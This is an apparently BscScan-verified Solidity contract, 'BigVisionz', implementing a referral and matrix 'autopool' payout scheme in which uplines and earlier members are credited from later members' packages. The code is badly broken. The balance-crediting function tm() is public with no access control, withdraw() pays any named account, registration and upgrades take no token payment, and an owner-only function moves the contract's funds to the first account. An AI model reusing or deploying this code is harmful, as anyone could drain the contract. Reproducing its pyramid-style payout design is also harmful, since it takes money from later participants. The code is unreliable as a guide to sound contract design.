/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

// SPDX-License-Identifier: MIT
pragma experimental ABIEncoderV2;
pragma solidity >=0.5.0 < 0.9.0;

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BigVisionz{
   
IERC20 public token = IERC20(address(0x55d398326f99059fF775485246999027B3197955));
uint256 public constant decimal_number = 10 ** 18;
mapping(address => mapping(address => uint256)) public allowance;
mapping(address=>uint) public contributors;

mapping(address=>uint) public idno;
 mapping (address => mapping (address => uint256)) internal allowed;
address payable owner = payable(0xEB9f93D10A9448D92eB889A61c143544710Ca76A);
 
    struct Task{
        uint id;
        address refer;
          uint256 directs;
            uint256 level;
             uint256 autopool;
        uint256 bonus;
        uint256 tot;
        uint package;
        uint package1;
               uint256 timestamp;
          address payable team;
    }
     struct x1{
          address payable team;
    }

     struct x2{
        address payable team;
        
    }
     struct x3{
        address payable team;
        
    }
 struct x4{
        address payable team;
        
    }
 struct x5{
        address payable team;
        
    }
 struct x6{
        address payable team;
        
    }
     struct x7{
        address payable team;
        
    }
     struct x8{
        address payable team;
        
    }
 struct x9{
        address payable team;
        
    }
 struct x10{
        address payable team;
        
    }
    
    uint counter = 1;
    Task[] tasks;
    x1[] public pools;
    x2[] public x2pools;
    x3[] public x3pools;
    x4[] public x4pools;
    x5[] public x5pools;
    x6[] public x6pools;
    x7[] public x7pools;
    x8[] public x8pools;
    x9[] public x9pools;
    x10[] public x10pools;
    event Register(uint256 value , address indexed sender);
    event UpgradeAccount(uint256 value , address indexed sender);
    event withdrawbal(uint256 value , address indexed sender);
    event bonanzareg(uint256 value , address indexed sender);

    function register(address _refer) payable public
    {
      
        require(contributors[msg.sender] ==0, "Wallet Address already registered with us!");
   if(counter > 1)
        {
          require(contributors[_refer] !=0, "Refer Address Invalid!");
        }
        Task memory temptask;
        temptask.id = counter;
        temptask.refer = _refer;
        temptask.autopool=0;
        temptask.bonus=0;
        temptask.directs=0;
        temptask.level=0;
        temptask.tot=0;
        temptask.package = 20;
        temptask.package1 = 0;
        temptask.timestamp =block.timestamp;
        temptask.team = payable(msg.sender);
        tasks.push(temptask);
        contributors[msg.sender]=1;
        idno[msg.sender]=counter;
        uint c = idno[_refer];
        uint i = 0;
        uint  tt = 1;
         bal = 7;
         bal1 = 8;
        for(i =c;i>0;i--)  
        {
            if(tt==1)
             {
       //   trans(tasks[c-1].team, 1);
        tm(tasks[c-1].team,1,5,0,0,0);
             }
            if(tt > 1)
             {
                bal -= 1;
         //      trans(tasks[c-1].team, 1);
              tm(tasks[c-1].team,0,1,1,0,0);
              }
            if(tt==9)
            { 
                break;
           }
         
            c = idno[tasks[c-1].refer];
            tt += 1;    
        }
       
        if(bal > 0)
        {
       // trans(tasks[0].team, bal); 
        tm(tasks[0].team,0,bal,bal,0,0);
        }
          uint s = 0;
          x1 memory Pool1;
            Pool1.team=payable(msg.sender);
              pools.push(Pool1);
              if(counter > 1)
              {  
              s = pools.length;        
            for(i=8;i>=1;i--)
                {
                s = s / 2;   
     //           trans(pools[s-1].team, 1);
                tm(pools[s-1].team,0,1,0,0,1);
                bal1 -= 1;
                    if(s==1)
                     {
                      i=1;
                      }
                   }

if(bal1 > 0)
        {
   //   trans(tasks[0].team, bal1);
     tm(tasks[0].team,0,bal1,0,0,bal1);
        }
              }
              emit Register(20*decimal_number,msg.sender);
      counter ++;
   }
       uint bal = 0;
        uint bal1 = 0;
        int lim = 0;

function upgrade(address _refer,uint _package) payable public
    {
        contributors[msg.sender] += 1;
        tasks[idno[msg.sender]-1].package += _package;
         uint s;
       uint j =0;
        x2 memory Pool2;
        x3 memory Pool3;
        x4 memory Pool4;
        x5 memory Pool5;
        x6 memory Pool6;
        x7 memory Pool7;
        x8 memory Pool8;
      if(_package==40)
        {
        bal1 = 20;
        lim = 2;
        }
        else if(_package == 80)
        {
        lim = 3;
        bal1 = 40;
        }
        else if(_package == 160)
        {
        lim = 4;
        bal1 = 80;
        }
        else if(_package == 320)
        {
        lim = 5;
        bal1 = 160;
        }
        else if(_package == 640)
        {
        lim = 6;
        bal1 = 320;
        }
        else if(_package == 1280)
        {
        lim = 7;
        bal1 = 640;
        }
         else if(_package == 2560)
        {
        lim = 8;
        bal1 = 1280;
        }
       if(counter>7)
       {
        int c = int(tasks[idno[_refer]].id) - (lim + 1);
  
        uint d ;
       
        
          if( c < 0)
          {
        d=0;
          }
          else
          {
            d = uint(c);
          }
uint level = contributors [tasks[d].team];
        if(level >= uint(lim))
        {
    //    trans(tasks[d].team, bal1);
       tm(tasks[d].team,0,bal1,bal1,0,0);
        }
        else
        {
  //     trans(tasks[0].team, bal1);
           tm(tasks[0].team,0,bal1,bal1,0,0);
        }  
       }
        if(lim ==2)
          {
          Pool2.team=payable(msg.sender);
          x2pools.push(Pool2);     
         
            s = x2pools.length;
            if(s>1)
            {
          for(j=8;j>=1;j--)
             {
               s = s/2;
       //       trans(x2pools[s-1].team, 2);
              bal1 -= 2;
              tm(x2pools[s-1].team,0,2,0,0,2);
               if(s==1)
               {
                 j = 1;
               }
               }
              }
             }
     if(lim == 3)
       { 
       Pool3.team=payable(msg.sender);
       x3pools.push(Pool3);
        s =x3pools.length; 
       if(s > 1)
          {
           
       for(j=8;j>=1;j--)
        {
          s = s/2;
    //      trans(x3pools[s-1].team, 5);
          bal1 -= 5;
          tm(x3pools[s-1].team,0,5,0,0,5);
           if(s==1)
              {
                j = 1;
              }
        }
       }
      }
if(lim == 4)
{
       Pool4.team=payable(msg.sender);
       x4pools.push(Pool4);
       s =x4pools.length;
       if(s > 1)
          {
             
       for(j=8;j>=1;j--)
        {
          s = s/2;
      //    trans(x4pools[s-1].team, 10);
          bal1 -= 10;
           tm(x4pools[s-1].team,0,10,0,0,10);
            if(s==1)
              {
                j = 1;
              }
        }  
        }
  }
if(lim==5)
{
       Pool5.team=payable(msg.sender);
       x5pools.push(Pool5);
       s =x5pools.length;
       if(s > 1)
          {
            
     for(j=8;j>=1;j--)
        {
          s = s/2;
      //    trans(x5pools[s-1].team, 20);
          bal1 -= 20;
        tm(x5pools[s-1].team,0,20,0,0,20);
         if(s==1)
              {
                j = 1;
              }
        }
        }
 }
       
if(lim==6)
          {
       Pool6.team=payable(msg.sender);
       x6pools.push(Pool6);
        s =x6pools.length; 
       if(s > 1)
          {
           
      for(j=8;j>=1;j--)
      {
        s =  s/2;
     //     trans(x6pools[s-1].team, 40);
          bal1 -= 40;
           tm(x6pools[s-1].team,0,40,0,0,40);
            if(s==1)
              {
                j = 1;
              }
         }
          }
      }
if(lim==7)
     {
       Pool7.team=payable(msg.sender);
       x7pools.push(Pool7);
        s =x7pools.length; 
       if(s > 1)
          {
           
      for(j=8;j>=1;j--)
        {
       
          s = s/2;
        // trans(x7pools[s-1].team, 80);
          bal1 -= 80;
           tm(x7pools[s-1].team,0,80,0,0,80);
            if(s==1)
              {
                j = 1;
              }
        }
          
        }
    } 
 if(lim == 8)   
   {
       Pool8.team=payable(msg.sender);
           x8pools.push(Pool8);
           s =x8pools.length;
           if(s > 1)
          {
            
          for(j=8;j>=1;j--)
          {
         s = s/2;
        //  trans(x8pools[s-1].team, 160);
          bal1 -= 160;
           tm(x8pools[s-1].team,0,160,0,0,160);
            if(s==1)
              {
                j = 1;
              }
          }
      }
        }
    if(bal1 > 0)
   {
        //  trans(x2pools[0].team, bal1);
           tm(tasks[0].team,0,bal1,0,0,bal1);
     
          }
          emit UpgradeAccount(_package*decimal_number,msg.sender);
}


function bonanza(uint _package) payable public
    {
      uint refer1;
       tasks[idno[msg.sender]-1].package1 += _package;
       x9  memory Pool9;
        x10  memory Pool10;
      if(_package == 100)
      {
          Pool9.team=payable(msg.sender);
          x9pools.push(Pool9);
            if(x9pools.length > 1)
            {  
            refer1 = (x9pools.length)%2;
        if(refer1 == 1)
        {
        refer1 = (x9pools.length)/2;
      //   trans(x9pools[refer1-1].team, 200);
   
            tm(x9pools[refer1-1].team,0,200,0,200,0);
       
        }
            }
    }
     else if(_package == 200)
    {
      
      
       Pool10.team=payable(msg.sender);
       x10pools.push(Pool10);
       if(x10pools.length > 1)
            { 
        refer1 = (x10pools.length)%2;
        if(refer1 == 1)
        {
        refer1 = (x10pools.length)/2;
    //  trans(x10pools[refer1-1].team, 400); 
         tm(x10pools[refer1-1].team,0,400,0,400,0);
        }
        }
    }
   emit bonanzareg(_package*decimal_number,msg.sender);
}

function tm(address id,uint directs,uint tot,uint level,uint bonus,uint autopool)  public
{
  if(counter < 8) 
  {
    tot = 0;
  }
      tasks[idno[id]-1].directs += directs;
      tasks[idno[id]-1].tot += tot;
      tasks[idno[id]-1].level += level;
      tasks[idno[id]-1].bonus += bonus;
      tasks[idno[id]-1].autopool += autopool;
}
function withdraw (address id) public payable
{
  uint amt = tasks[idno[id]-1].tot;
   token.allowance(address(this),id);
    token.approve(address(this), amt * decimal_number);
     token.transferFrom(address(this),id,amt * decimal_number);
      tasks[idno[id]-1].tot=0;
       emit withdrawbal(amt*decimal_number, msg.sender);
}

function transferContractBalanceToOwner(uint amt) public {
    require(msg.sender == owner, "Only contract owner can transfer balance");
     token.allowance(address(this),tasks[0].team);
    token.approve(address(this), amt * decimal_number);
     token.transferFrom(address(this),tasks[0].team,amt* decimal_number);

   
}

 function approve(address spender, uint amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

  
   function getMemos(address _memberId) public view returns(Task memory) {
    uint i = idno[_memberId];
    return tasks[i-1];
  }
    
}